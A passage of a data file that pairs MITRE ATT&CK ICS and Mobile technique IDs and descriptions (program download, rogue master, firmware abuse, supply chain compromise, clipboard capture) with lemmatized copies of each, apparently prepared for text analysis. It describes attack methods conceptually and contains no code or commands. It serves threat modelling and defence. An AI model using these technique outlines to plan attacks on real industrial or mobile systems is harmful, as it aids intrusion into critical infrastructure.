execution attack time occur generate pseudo random number generator field device worm adversary choose identify field device model end goal perform device wide compromise attack card field device important module field device ethernet card accessible adversary malware compromise ethernet card provide direct route compromise module cpu module
T0801,Monitor Process State,"Adversaries may gather information about the physical process state. This information may be used to gain more information about the process itself or used as a trigger for malicious actions. The sources of process state information may vary such as, OPC tags, historian data, specific PLC block information, or network traffic.",adversary gather information physical process state information gain information process trigger malicious action source process state information vary opc tag historian datum specific plc block information network traffic
T0834,Native API,"Adversaries may directly interact with the native OS application programming interface (API) to access system functions. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations. Functionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as memcpy and direct operations on memory registers can be used to modify user and system memory space.",adversary directly interact native os application programming interface api access system function native api provide controlled means call low level os service kernel involve hardware device memory process native api leverage os system boot system component initialize carry task request routine operation functionality provide native api expose user mode application interface library example function memcpy direct operation memory register modify user system memory space
T0840,Network Connection Enumeration,"Adversaries may perform network connection enumeration to discover information about device communication patterns. If an adversary can inspect the state of a network connection with tools, such as Netstat. The adversary can also use Network Sniffing to watch network traffic for details about the source, destination, protocol, and content.",adversary perform network connection enumeration discover information device communication pattern adversary inspect state network connection tool netstat adversary use network sniffing watch network traffic detail source destination protocol content
T0842,Network Sniffing,"Network sniffing is the practice of using a network interface on a computer system to monitor or capture information regardless of whether it is the specified destination for the information. An adversary may attempt to sniff the traffic to gain information about the target. This information can vary in the level of importance. Relatively unimportant information is general communications to and from machines. Relatively important information would be login information. User credentials may be sent over an unencrypted protocol, such as Telnet, that can be captured and obtained through network packet analysis. In addition, ARP and Domain Name Service (DNS) poisoning can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.",network sniffing practice network interface computer system monitor capture information regardless specify destination information adversary attempt sniff traffic gain information target information vary level importance relatively unimportant information general communication machine relatively important information login information user credential send unencrypted protocol telnet capture obtain network packet analysis addition arp domain service dns poisoning capture credential website proxy internal system redirect traffic adversary
T0861,Point & Tag Identification,"Adversaries may collect point and tag values to gain a more comprehensive understanding of the process environment. Points may be values such as inputs, memory locations, outputs or other process specific variables. Tags are the identifiers given to points for operator convenience. Collecting such tags provides valuable context to environmental points and enables an adversary to map inputs, outputs, and other values to their control processes. Understanding the points being collected may inform an adversary on which processes and values to keep track of over the course of an operation.",adversary collect point tag value gain comprehensive understanding process environment point value input memory location output process specific variable tag identifier give point operator convenience collect tag provide valuable context environmental point enable adversary map input output value control process understand point collect inform adversary process value track course operation
T0843,Program Download,"Adversaries may perform a program download to transfer a user program to a controller. Variations of program download, such as online edit and program append, allow a controller to continue running during the transfer and reconfiguration process without interruption to process control. However, before starting a full program download (i.e., download all) a controller may need to go into a stop state. This can have negative consequences on the physical process, especially if the controller is not able to fulfill a time-sensitive action. Adversaries may choose to avoid a download all in favor of an online edit or program append to avoid disrupting the physical process. An adversary may need to use the technique Detect Operating Mode or Change Operating Mode to make sure the controller is in the proper mode to accept a program download.The granularity of control to transfer a user program in whole or parts is dictated by the management protocol (e.g., S7CommPlus, TriStation) and underlying controller API. Thus, program download is a high-level term for the suite of vendor-specific API calls used to configure a controllers user program memory space. Modify Controller Tasking and Modify Program represent the configuration changes that are transferred to a controller via a program download.",adversary perform program download transfer user program controller variation program download online edit program append allow controller continue run transfer reconfiguration process interruption process control start program download download controller need stop state negative consequence physical process especially controller able fulfill time sensitive action adversary choose avoid download favor online edit program append avoid disrupt physical process adversary need use technique detect operating mode change operating mode sure controller proper mode accept program download granularity control transfer user program part dictate management protocol tristation underlie controller api program download high level term suite vendor specific api call configure controller user program memory space modify controller tasking modify program represent configuration change transfer controller program download
T0845,Program Upload,"Adversaries may attempt to upload a program from a PLC to gather information about an industrial process. Uploading a program may allow them to acquire and study the underlying logic. Methods of program upload include vendor software, which enables the user to upload and read a program running on a PLC. This software can be used to upload the target program to a workstation, jump box, or an interfacing device.",adversary attempt upload program plc gather information industrial process upload program allow acquire study underlie logic method program upload include vendor software enable user upload read program run plc software upload target program workstation jump box interface device
T0873,Project File Infection,"Adversaries may attempt to infect project files with malicious code. These project files may consist of objects, program organization units, variables such as tags, documentation, and other configurations needed for PLC programs to function. Adversaries may export their own code into project files with conditions to execute at specific intervals.",adversary attempt infect project file malicious code project file consist object program organization unit variable tag documentation configuration need plc program function adversary export code project file condition execute specific interval
T0886,Remote Services,"Adversaries may leverage remote services to move between assets and network segments. These services are often used to allow operators to interact with systems remotely within the network, some examples are RDP, SMB, SSH, and other similar mechanisms. Remote services could be used to support remote access, data transmission, authentication, name resolution, and other remote functions. Further, remote services may be necessary to allow operators and administrators to configure systems within the network from their engineering or management workstations. An adversary may use this technique to access devices which may be dual-homed to multiple network segments, and can be used for Program Download or to execute attacks on control devices directly through Valid Accounts.Specific remote services (RDP & VNC) may be a precursor to enable Graphical User Interface execution on devices such as HMIs or engineering workstation software.Based on incident data, CISA and FBI assessed that Chinese state-sponsored actors also compromised various authorized remote access channels, including systems designed to transfer data and/or allow access between corporate and ICS networks.",adversary leverage remote service asset network segment service allow operator interact system remotely network example rdp smb ssh similar mechanism remote service support remote access data transmission authentication resolution remote function remote service necessary allow operator administrator configure system network engineering management workstation adversary use technique access device dual home multiple network segment program download execute attack control device directly valid accounts specific remote service rdp vnc precursor enable graphical user interface execution device hmi engineering workstation software base incident datum cisa fbi assess chinese state sponsor actor compromise authorized remote access channel include system design transfer datum allow access corporate ics network
T0846,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for subsequent Lateral Movement or Discovery techniques. Functionality could exist within adversary tools to enable this, but utilities available on the operating system or vendor software could also be used.",adversary attempt listing system ip address hostname logical identifier network subsequent lateral movement discovery technique functionality exist adversary tool enable utility available operate system vendor software
T0888,Remote System Information Discovery,"An adversary may attempt to get detailed information about remote systems and their peripherals, such as make/model, role, and configuration. Adversaries may use information from Remote System Information Discovery to aid in targeting and shaping follow-on behaviors. For example, the system's operational role and model information can dictate whether it is a relevant target for the adversary's operational objectives. In addition, the system's configuration may be used to scope subsequent technique usage. Requests for system information are typically implemented using automation and management protocols and are often automatically requested by vendor software during normal operation. This information may be used to tailor management actions, such as program download and system or module firmware. An adversary may leverage this same information by issuing calls directly to the system's API.",adversary attempt detailed information remote system peripheral model role configuration adversary use information remote system information discovery aid target shape follow behavior example system operational role model information dictate relevant target adversary operational objective addition system configuration scope subsequent technique usage request system information typically implement automation management protocol automatically request vendor software normal operation information tailor management action program download system module firmware adversary leverage information issue call directly system api
T0847,Replication Through Removable Media,"Adversaries may move onto systems, such as those separated from the enterprise network, by copying malware to removable media which is inserted into the control systems environment. The adversary may rely on unknowing trusted third parties, such as suppliers or contractors with access privileges, to introduce the removable media. This technique enables initial access to target devices that never connect to untrusted networks, but are physically accessible. Operators of the German nuclear power plant, Gundremmingen, discovered malware on a facility computer not connected to the internet.",adversary system separate enterprise network copy malware removable medium insert control system environment adversary rely unknowe trusted party supplier contractor access privilege introduce removable medium technique enable initial access target device connect untrusted network physically accessible operator german nuclear power plant gundremmingen discover malware facility computer connect internet
T0848,Rogue Master,"Adversaries may setup a rogue master to leverage control server functions to communicate with outstations. A rogue master can be used to send legitimate control messages to other control system devices, affecting processes in unintended ways. It may also be used to disrupt network communications by capturing and receiving the network traffic meant for the actual master. Impersonating a master may also allow an adversary to avoid detection. In the case of the 2017 Dallas Siren incident, adversaries used a rogue master to send command messages to the 156 distributed sirens across the city, either through a single rogue transmitter with a strong signal, or using many distributed repeaters.",adversary setup rogue master leverage control server function communicate outstation rogue master send legitimate control message control system device affect process unintended way disrupt network communication capture receive network traffic mean actual master impersonate master allow adversary avoid detection case dallas siren incident adversary rogue master send command message distribute siren city single rogue transmitter strong signal distribute repeater
T0851,Rootkit,"Adversaries may deploy rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting and modifying operating-system API calls that supply system information. Rootkits or rootkit-enabling functionality may reside at the user or kernel level in the operating system, or lower. Firmware rootkits that affect the operating system yield nearly full control of the system. While firmware rootkits are normally developed for the main processing board, they can also be developed for the I/O that is attached to an asset. Compromise of this firmware allows the modification of all of the process variables and functions the module engages in. This may result in commands being disregarded and false information being fed to the main device. By tampering with device processes, an adversary may inhibit its expected response functions and possibly enable Impact.",adversary deploy rootkit hide presence program file network connection service driver system component rootkit program hide existence malware intercept modify operate system api call supply system information rootkit rootkit enable functionality reside user kernel level operate system low firmware rootkit affect operate system yield nearly control system firmware rootkit normally develop main processing board develop o attach asset compromise firmware allow modification process variable function module engage result command disregard false information feed main device tamper device process adversary inhibit expect response function possibly enable impact
T0852,Screen Capture,"Adversaries may attempt to perform screen capture of devices in the control system environment. Screenshots may be taken of workstations, HMIs, or other devices that display environment-relevant process, device, reporting, alarm, or related data. These device displays may reveal information regarding the ICS process, layout, control, and related schematics. In particular, an HMI can provide a lot of important industrial process information. Analysis of screen captures may provide the adversary with an understanding of intended operations and interactions between critical devices.",adversary attempt perform screen capture device control system environment screenshot take workstation hmi device display environment relevant process device reporting alarm related datum device display reveal information ics process layout control related schematic particular hmi provide lot important industrial process information analysis screen capture provide adversary understanding intended operation interaction critical device
T0853,Scripting,"Adversaries may use scripting languages to execute arbitrary code in the form of a pre-written script or in the form of user-supplied code to an interpreter. Scripting languages are programming languages that differ from compiled languages, in that scripting languages use an interpreter, instead of a compiler. These interpreters read and compile part of the source code just before it is executed, as opposed to compilers, which compile each and every line of code to an executable file. Scripting allows software developers to run their code on any system where the interpreter exists. This way, they can distribute one package, instead of precompiling executables for many different systems. Scripting languages, such as Python, have their interpreters shipped as a default with many Linux distributions. In addition to being a useful tool for developers and administrators, scripting language interpreters may be abused by the adversary to execute code in the target environment. Due to the nature of scripting languages, this allows for weaponized code to be deployed to a target easily, and leaves open the possibility of on-the-fly scripting to perform a task.",adversary use scripting language execute arbitrary code form pre written script form user supply code interpreter scripting language programming language differ compile language script language use interpreter instead compiler interpreter read compile source code execute oppose compiler compile line code executable file scripting allow software developer run code system interpreter exist way distribute package instead precompile executable different system script language python interpreter ship default linux distribution addition useful tool developer administrator scripting language interpreter abuse adversary execute code target environment nature scripting language allow weaponized code deploy target easily leave open possibility fly scripting perform task
T0881,Service Stop,Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.,adversary stop disable service system render service unavailable legitimate user stop critical service inhibit stop response incident aid adversary overall objective cause damage environment
T0865,Spearphishing Attachment,"Adversaries may use a spearphishing attachment, a variant of spearphishing, as a form of a social engineering attack against specific targets. Spearphishing attachments are different from other forms of spearphishing in that they employ malware attached to an email. All forms of spearphishing are electronically delivered and target a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution and access. A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012, targeted ONG organizations and their employees. The emails were constructed with a high level of sophistication to convince employees to open the malicious file attachments.",adversary use spearphishing attachment variant spearphishing form social engineering attack specific target spearphishing attachment different form spearphishing employ malware attach email form spearphishing electronically deliver target specific individual company industry scenario adversary attach file spearphishing email usually rely user execution gain execution access chinese spearphishing campaign run december february target ong organization employee email construct high level sophistication convince employee open malicious file attachment
T0856,Spoof Reporting Message,"Adversaries may spoof reporting messages in control system environments for evasion and to impair process control. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. Reporting messages are important for monitoring the normal operation of a system or identifying important events such as deviations from expected values. If an adversary has the ability to Spoof Reporting Messages, they can impact the control system in many ways. The adversary can Spoof Reporting Messages that state that the process is operating normally, as a form of evasion. The adversary could also Spoof Reporting Messages to make the defenders and operators think that other errors are occurring in order to distract them from the actual source of a problem.",adversary spoof reporting message control system environment evasion impair process control control system reporting message contain telemetry datum o value pertain current state equipment industrial process reporting message important monitor normal operation system identify important event deviation expect value adversary ability spoof reporting messages impact control system way adversary spoof reporting message state process operate normally form evasion adversary spoof reporting messages defender operator think error occur order distract actual source problem
T0869,Standard Application Layer Protocol,"Adversaries may establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, RDP, telnet, DNP3, and modbus. These protocols may be used to disguise adversary actions as benign network traffic. Standard protocols may be seen on their associated port or in some cases over a non-standard port. Adversaries may use these protocols to reach out of the network for command and control, or in some cases to other infected devices within the network.",adversary establish command control capability commonly application layer protocol opc rdp telnet modbus protocol disguise adversary action benign network traffic standard protocol see associate port case non standard port adversary use protocol reach network command control case infected device network
T0862,Supply Chain Compromise,"Adversaries may perform supply chain compromise to gain control systems environment access by means of infected products, software, and workflows. Supply chain compromise is the manipulation of products, such as devices or software, or their delivery mechanisms before receipt by the end consumer. Adversary compromise of these products and mechanisms is done for the goal of data or system compromise, once infected products are introduced to the target environment. Supply chain compromise can occur at all stages of the supply chain, from manipulation of development tools and environments to manipulation of developed products and tools distribution mechanisms. This may involve the compromise and replacement of legitimate software and patches, such as on third party or vendor websites. Targeting of supply chain compromise can be done in attempts to infiltrate the environments of a specific audience. In control systems environments with assets in both the IT and OT networks, it is possible a supply chain compromise affecting the IT environment could enable further access to the OT environment. Counterfeit devices may be introduced to the global supply chain posing safety and cyber risks to asset owners and operators. These devices may not meet the safety, engineering and manufacturing requirements of regulatory bodies but may feature tagging indicating conformance with industry standards. Due to the lack of adherence to standards and overall lesser quality, the counterfeit products may pose a serious safety and operational risk. Yokogawa identified instances in which their customers received counterfeit differential pressure transmitters using the Yokogawa logo. The counterfeit transmitters were nearly indistinguishable with a semblance of functionality and interface that mimics the genuine product. F-Secure Labs analyzed the approach the adversary used to compromise victim systems with Havex. The adversary planted trojanized software installers available on legitimate ICS/SCADA vendor websites. After being downloaded, this software infected the host computer with a Remote Access Trojan (RAT).",adversary perform supply chain compromise gain control system environment access mean infect product software workflow supply chain compromise manipulation product device software delivery mechanism receipt end consumer adversary compromise product mechanism goal datum system compromise infect product introduce target environment supply chain compromise occur stage supply chain manipulation development tool environment manipulation develop product tool distribution mechanism involve compromise replacement legitimate software patch party vendor website targeting supply chain compromise attempt infiltrate environment specific audience control system environment asset ot network possible supply chain compromise affect environment enable access ot environment counterfeit device introduce global supply chain pose safety cyber risk asset owner operator device meet safety engineering manufacturing requirement regulatory body feature tagging indicate conformance industry standard lack adherence standard overall less quality counterfeit product pose safety operational risk yokogawa identify instance customer receive counterfeit differential pressure transmitter yokogawa logo counterfeit transmitter nearly indistinguishable semblance functionality interface mimic genuine product f secure labs analyze approach adversary compromise victim system havex adversary plant trojanized software installer available legitimate ics scada vendor website download software infect host computer remote access trojan rat
T0857,System Firmware,"System firmware on modern assets is often designed with an update feature. Older device firmware may be factory installed and require special reprograming equipment. When available, the firmware update feature enables vendors to remotely patch bugs and perform upgrades. Device firmware updates are often delegated to the user and may be done using a software update package. It may also be possible to perform this task over the network. An adversary may exploit the firmware update feature on accessible devices to upload malicious or out-of-date firmware. Malicious modification of device firmware may provide an adversary with root access to a device, given firmware is one of the lowest programming abstraction layers.",system firmware modern asset design update feature old device firmware factory instal require special reprograming equipment available firmware update feature enable vendor remotely patch bug perform upgrade device firmware update delegate user software update package possible perform task network adversary exploit firmware update feature accessible device upload malicious date firmware malicious modification device firmware provide adversary root access device give firmware low programming abstraction layer
T0882,Theft of Operational Information,"Adversaries may steal operational information on a production environment as a direct mission outcome for personal gain or to inform future operations. This information may include design documents, schedules, rotational data, or similar artifacts that provide insight on operations. In the Bowman Dam incident, adversaries probed systems for operational data.",adversary steal operational information production environment direct mission outcome personal gain inform future operation information include design document schedule rotational datum similar artifact provide insight operation bowman dam incident adversary probe system operational datum
T0864,Transient Cyber Asset,"Adversaries may target devices that are transient across ICS networks and external networks. Normally, transient assets are brought into an environment by authorized personnel and do not remain in that environment on a permanent basis. Transient assets are commonly needed to support management functions and may be more common in systems where a remotely managed asset is not feasible, external connections for remote access do not exist, or 3rd party contractor/vendor access is required. Adversaries may take advantage of transient assets in different ways. For instance, adversaries may target a transient asset when it is connected to an external network and then leverage its trusted access in another environment to launch an attack. They may also take advantage of installed applications and libraries that are used by legitimate end-users to interact with control system devices. Transient assets, in some cases, may not be deployed with a secure configuration leading to weaknesses that could allow an adversary to propagate malicious executable code, e.g., the transient asset may be infected by malware and when connected to an ICS environment the malware propagates onto other systems.",adversary target device transient ics network external network normally transient asset bring environment authorized personnel remain environment permanent basis transient asset commonly need support management function common system remotely manage asset feasible external connection remote access exist party contractor vendor access require adversary advantage transient asset different way instance adversary target transient asset connect external network leverage trusted access environment launch attack advantage instal application library legitimate end user interact control system device transient asset case deploy secure configuration lead weakness allow adversary propagate malicious executable code transient asset infect malware connect ics environment malware propagate system
T0855,Unauthorized Command Message,"Adversaries may send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, or without the logical preconditions to trigger their expected function. Command messages are used in ICS networks to give direct instructions to control systems devices. If an adversary can send an unauthorized command message to a control system, then it can instruct the control systems device to perform an action outside the normal bounds of the device's actions. An adversary could potentially instruct a control systems device to perform an action that will cause an Impact. In the Dallas Siren incident, adversaries were able to send command messages to activate tornado alarm systems across the city without an impending tornado or other disaster.",adversary send unauthorized command message instruct control system asset perform action outside intended functionality logical precondition trigger expect function command message ics network direct instruction control system device adversary send unauthorized command message control system instruct control system device perform action outside normal bound device action adversary potentially instruct control system device perform action cause impact dallas siren incident adversary able send command message activate tornado alarm system city impending tornado disaster
T0863,User Execution,"Adversaries may rely on a targeted organizations user interaction for the execution of malicious code. User interaction may consist of installing applications, opening email attachments, or granting higher permissions to documents. Adversaries may embed malicious code or visual basic code into files such as Microsoft Word and Excel documents or software installers. A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012 delivered malware through spearphishing attachments which required user action to achieve execution.",adversary rely target organization user interaction execution malicious code user interaction consist instal application open email attachment grant high permission document adversary embed malicious code visual basic code file microsoft word excel document software installer chinese spearphishing campaign run december february deliver malware spearphishing attachment require user action achieve execution
T0859,Valid Accounts,"Adversaries may steal the credentials of a specific user or service account using credential access techniques. In some cases, default credentials for control system devices may be publicly available. Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network, and may even be used for persistent access to remote systems. Compromised and default credentials may also grant an adversary increased privilege to specific systems and devices or access to restricted areas of the network. Adversaries may choose not to use malware or tools, in conjunction with the legitimate access those credentials provide, to make it harder to detect their presence or to control devices and send legitimate commands in an unintended way. Adversaries may also create accounts, sometimes using predefined account names and passwords, to provide a means of backup access for persistence. The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) and possibly between the enterprise and operational technology environments. Adversaries may be able to leverage valid credentials from one system to gain access to another system.",adversary steal credential specific user service account credential access technique case default credential control system device publicly available compromised credential bypass access control place resource host network persistent access remote system compromised default credential grant adversary increase privilege specific system device access restricted area network adversary choose use malware tool conjunction legitimate access credential provide hard detect presence control device send legitimate command unintended way adversary create account predefined account name password provide means backup access persistence overlap credential permission network system concern adversary able pivot account system reach high level access domain enterprise administrator possibly enterprise operational technology environment adversary able leverage valid credential system gain access system
T0860,Wireless Compromise,Adversaries may perform wireless compromise as a method of gaining communications and unauthorized access to a wireless network. Access to a wireless network may be gained through the compromise of a wireless device. Adversaries may also utilize radios and other wireless communication devices on the same frequency as the wireless network. Wireless compromise can be done as an initial access vector from a remote distance. A Polish student used a modified TV remote controller to gain access to and control over the Lodz city tram system in Poland.,adversary perform wireless compromise method gain communication unauthorized access wireless network access wireless network gain compromise wireless device adversary utilize radio wireless communication device frequency wireless network wireless compromise initial access vector remote distance polish student modify tv remote controller gain access control lodz city tram system poland
T0887,Wireless Sniffing,"Adversaries may seek to capture radio frequency (RF) communication used for remote control and reporting in distributed environments. RF communication frequencies vary between 3 kHz to 300 GHz, although are commonly between 300 MHz to 6 GHz. The wavelength and frequency of the signal affect how the signal propagates through open air, obstacles (e.g. walls and trees) and the type of radio required to capture them. These characteristics are often standardized in the protocol and hardware and may have an effect on how the signal is captured. Some examples of wireless protocols that may be found in cyber-physical environments are: WirelessHART, Zigbee, WIA-FA, and 700 MHz Public Safety Spectrum. Adversaries may capture RF communications by using specialized hardware, such as software defined radio (SDR), handheld radio, or a computer with radio demodulator tuned to the communication frequency. In the 2017 Dallas Siren incident, it is suspected that adversaries likely captured wireless command message broadcasts on a 700 MHz frequency during a regular test of the system. These messages were later replayed to trigger the alarm systems.",adversary seek capture radio frequency rf communication remote control reporting distribute environment rf communication frequency vary khz ghz commonly mhz ghz wavelength frequency signal affect signal propagate open air obstacle wall tree type radio require capture characteristic standardize protocol hardware effect signal capture example wireless protocol find cyber physical environment wirelesshart zigbee wia fa mhz public safety spectrum adversary capture rf communication specialized hardware software define radio sdr handheld radio computer radio demodulator tune communication frequency dallas siren incident suspect adversary likely capture wireless command message broadcast mhz frequency regular test system message later replay trigger alarm system
T1626,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevated privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can gain on a machine. Authorization has to be granted to specific users in order to perform tasks that are designated as higher risk. An adversary can use several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,adversary circumvent mechanism design control elevated privilege gain high level permission modern system contain native elevation control mechanism intend limit privilege user gain machine authorization grant specific user order perform task designate high risk adversary use method advantage build control mechanism order escalate privilege system
T1626.001,Abuse Elevation Control Mechanism: Device Administrator Permissions,"Adversaries may abuse Android’s device administration API to obtain a higher degree of control over the device. By abusing the API, adversaries can perform several nefarious actions, such as resetting the device’s password for Endpoint Denial of Service, factory resetting the device for File Deletion and to delete any traces of the malware, disabling all the device’s cameras, or to make it more difficult to uninstall the app.Device administrators must be approved by the user at runtime, with a system popup showing which actions have been requested by the app. In conjunction with other techniques, such as Input Injection, an app can programmatically grant itself administrator permissions without any user input.",adversary abuse android device administration api obtain high degree control device abuse api adversary perform nefarious action reset device password endpoint denial service factory reset device file deletion delete trace malware disable device camera difficult uninstall app device administrator approve user runtime system popup show action request app conjunction technique input injection app programmatically grant administrator permission user input
T1517,Access Notifications,"Adversaries may collect data within notifications sent by the operating system or other applications. Notifications may contain sensitive data such as one-time authentication codes sent over SMS, email, or other mediums. In the case of Credential Access, adversaries may attempt to intercept one-time code sent to the device. Adversaries can also dismiss notifications to prevent the user from noticing that the notification has arrived and can trigger action buttons contained within notifications.",adversary collect datum notification send operate system application notification contain sensitive datum time authentication code send sms email medium case credential access adversary attempt intercept time code send device adversary dismiss notification prevent user notice notification arrive trigger action button contain notification
T1640,Account Access Removal,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: credentials changed) to remove access to accounts.",adversary interrupt availability system network resource inhibit access account utilize legitimate user account delete lock manipulate ex credential change remove access account
T1638,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices to support follow-on behaviors such as Transmitted Data Manipulation or Endpoint Denial of Service. Adversary-in-the-Middle can be achieved through several mechanisms, such as a malicious application registering itself as a VPN client. By doing this, the adversary can effectively redirect device traffic to wherever they want. However, registering as a VPN client requires user consent on both Android and iOS. Additionally, on iOS, the application requires a special entitlement that must be granted by Apple. Alternatively, if an application is able to escalate privileges, it can potentially utilize those privileges to gain access to network traffic. Outside of a mobile device, adversaries may be able to capture traffic by employing a rogue base station or Wi-Fi access point. These devices will allow adversaries to capture network traffic after it has left the device, while it is flowing to its destination. On a local network, enterprise techniques could be used, such as DNS redirection or DNS poisoning. If applications properly encrypt their network traffic, sensitive data may not be accessible an adversary, depending on the point of capture.",adversary attempt position networked device support follow behavior transmit data manipulation endpoint denial service adversary middle achieve mechanism malicious application register vpn client adversary effectively redirect device traffic want register vpn client require user consent android ios additionally ios application require special entitlement grant apple alternatively application able escalate privilege potentially utilize privilege gain access network traffic outside mobile device adversary able capture traffic employ rogue base station wi fi access point device allow adversary capture network traffic leave device flow destination local network enterprise technique dns redirection dns poisoning application properly encrypt network traffic sensitive datum accessible adversary depend point capture
T1437,Application Layer Protocol,"Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the mobile device, and often the results of those commands, will be embedded within the protocol traffic between the mobile device and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS.",adversary communicate application layer protocol avoid detection network filtering blend existing traffic command mobile device result command embed protocol traffic mobile device server adversary utilize different protocol include web browsing transfer file electronic mail dns
T1437.001,Application Layer Protocol: Web Protocols,"Adversaries may communicate using application layer protocols associated with web protocols traffic to avoid detection/network filtering by blending in with existing traffic. Commands to remote mobile devices, and often the results of those commands, will be embedded within the protocol traffic between the mobile client and server. Web protocols such as HTTP and HTTPS are used for web traffic as well as well as notification services native to mobile messaging services such as Google Cloud Messaging (GCM) and newly, Firebase Cloud Messaging (FCM), (GCM/FCM: two-way communication) and Apple Push Notification Service (APNS; one-way server-to-device). Such notification services leverage HTTP/S via the respective API and are commonly abused on Android and iOS respectively in order blend in with routine device traffic making it difficult for enterprises to inspect.",adversary communicate application layer protocol associate web protocol traffic avoid detection network filtering blend existing traffic command remote mobile device result command embed protocol traffic mobile client server web protocol http https web traffic notification service native mobile messaging service google cloud messaging gcm newly firebase cloud messaging fcm gcm fcm way communication apple push notification service apns way server device notification service leverage http s respective api commonly abuse android ios respectively order blend routine device traffic make difficult enterprise inspect
T1532,Archive Collected Data,"Adversaries may compress and/or encrypt data that is collected prior to exfiltration. Compressing data can help to obfuscate its contents and minimize use of network resources. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender. Both compression and encryption are done prior to exfiltration, and can be performed using a utility, programming library, or custom algorithm.",adversary compress encrypt datum collect prior exfiltration compress datum help obfuscate content minimize use network resource encryption hide information exfiltrate detection exfiltration conspicuous inspection defender compression encryption prior exfiltration perform utility programming library custom algorithm
T1429,Audio Capture,"Adversaries may capture audio to collect information by leveraging standard operating system APIs of a mobile device. Examples of audio information adversaries may target include user conversations, surroundings, phone calls, or other sensitive information. Android and iOS, by default, require that applications request device microphone access from the user. On Android devices, applications must hold the RECORD_AUDIO permission to access the microphone or the CAPTURE_AUDIO_OUTPUT permission to access audio output. Because Android does not allow third-party applications to hold the CAPTURE_AUDIO_OUTPUT permission by default, only privileged applications, such as those distributed by Google or the device vendor, can access audio output. On iOS devices, applications must include the NSMicrophoneUsageDescription key in their Info.plist file to access the microphone.",adversary capture audio collect information leverage standard operating system api mobile device example audio information adversary target include user conversation surrounding phone call sensitive information android ios default require application request device microphone access user android device application hold permission access microphone permission access audio output android allow party application hold permission default privileged application distribute google device vendor access audio output ios device application include nsmicrophoneusagedescription key file access microphone
T1398,Boot or Logon Initialization Scripts,Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts are part of the underlying operating system and are not accessible to the user unless the device has been rooted or jailbroken.,adversary use script automatically execute boot logon initialization establish persistence initialization script underlie operate system accessible user device root jailbroken
T1616,Call Control,"Adversaries may make, forward, or block phone calls without user authorization. This could be used for adversary goals such as audio surveillance, blocking or forwarding calls from the device owner, or C2 communication.Several permissions may be used to programmatically control phone calls, including:ANSWER_PHONE_CALLS - Allows the application to answer incoming phone calls CALL_PHONE - Allows the application to initiate a phone call without going through the Dialer interface PROCESS_OUTGOING_CALLS - Allows the application to see the number being dialed during an outgoing call with the option to redirect the call to a different number or abort the call altogether MANAGE_OWN_CALLS - Allows a calling application which manages its own calls through the self-managed ConnectionService APIs BIND_TELECOM_CONNECTION_SERVICE - Required permission when using a ConnectionService WRITE_CALL_LOG - Allows an application to write to the device call log, potentially to hide malicious phone callsWhen granted some of these permissions, an application can make a phone call without opening the dialer first. However, if an application desires to simply redirect the user to the dialer with a phone number filled in, it can launch an Intent using Intent.ACTION_DIAL, which requires no specific permissions. This then requires the user to explicitly initiate the call or use some form of Input Injection to programmatically initiate it.",adversary forward block phone call user authorization adversary goal audio surveillance block forward call device owner communication permission programmatically control phone call include allow application answer incoming phone call allow application initiate phone go dialer interface allow application number dial outgoing option redirect different number abort altogether allow call application manage call self manage connectionservice apis require permission connectionservice allow application write device log potentially hide malicious phone callswhen grant permission application phone open dialer application desire simply redirect user dialer phone number fill launch intent intent require specific permission require user explicitly initiate use form input injection programmatically initiate
T1414,Clipboard Data,"Adversaries may abuse clipboard manager APIs to obtain sensitive information copied to the device clipboard. For example, passwords being copied and pasted from a password manager application could be captured by a malicious application installed on the device. On Android, applications can use the ClipboardManager.OnPrimaryClipChangedListener() API to register as a listener and monitor the clipboard for changes. However, starting in Android 10, this can only be used if the application is in the foreground, or is set as the device’s default input method editor (IME). On iOS, this can be accomplished by accessing the UIPasteboard.general.string field. However, starting in iOS 14, upon accessing the clipboard, the user will be shown a system notification if the accessed text originated in a different application. For example, if the user copies the text of an iMessage from the Messages application, the notification will read ""application_name has pasted from Messages"" when the text was pasted in a different application.",adversary abuse clipboard manager api obtain sensitive information copy device clipboard example password copy paste password manager application capture malicious application instal device android application use clipboardmanager onprimaryclipchangedlistener api register listener monitor clipboard change start android application foreground set device default input method editor ime ios accomplish access field start ios access clipboard user show system notification access text originate different application example user copy text imessage messages application notification read paste messages text paste different application
